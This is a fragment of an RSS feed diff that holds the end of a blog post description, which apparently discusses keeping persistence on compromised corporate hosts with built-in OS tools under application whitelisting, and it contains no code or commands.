+I highly recommend that you start with this presentation as it lays the foundation for this post.
+The premise is, how can we maintain persistence in a corporate environment, using tools and defaults provided by the host OS we have compromised. This is a very important concept, given the shift in many organizations to an Application Whitelisting Defense model.]]></description>
+</item>
+</channel>
 </rss>
